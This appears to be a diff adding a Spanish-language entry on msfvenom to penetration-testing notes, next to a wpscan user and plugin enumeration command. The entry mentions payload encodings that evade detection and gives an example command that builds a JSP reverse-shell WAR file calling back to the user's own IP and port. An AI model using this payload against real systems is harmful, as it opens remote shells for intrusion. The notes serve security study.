@@ -276,5 +276,18 @@ Para realizar un escaneo más **exhaustivo**, que incluya la **enumeración de u
 
 	wpscan --url http://example.com --enumerate u,p
 
+***MSFVenom***: Herramienta que forma parte del Metasploit Framework, uno de los marcos de trabajo más populares utilizados para la prueba de penetración y el desarrollo de exploits.
 
+msfvenom se utiliza para generar varios tipos de payloads, que son piezas de código que se pueden ejecutar en una máquina de destino para realizar una acción específica, como abrir un shell de comando, crear una puerta trasera, o cualquier otra acción que pueda ser útil en un contexto de seguridad.
+
+Estos payloads pueden ser generados para diferentes plataformas (Windows, Linux, macOS, etc.) y lenguajes de programación (Python, PHP, Java, etc.), y se pueden utilizar en una amplia gama de escenarios de explotación.
+
+Las capacidades de msfvenom incluyen:
+
+Generar payloads para una variedad de exploits.
+Crear encodings personalizados para ayudar a los payloads a evitar la detección por parte de los sistemas de defensa.
+Combinar payloads y exploits en un solo archivo para la entrega.
+Es una herramienta muy potente y flexible que es fundamental para el trabajo en pruebas de penetración y ciberseguridad.
+
+***Ejemplo de Comando***: $ msfvenom -p java/jsp_shell_reverse_tcp lhost=< Tu dirección IP > lport=< Puerto > -f war -o shell.war 
 
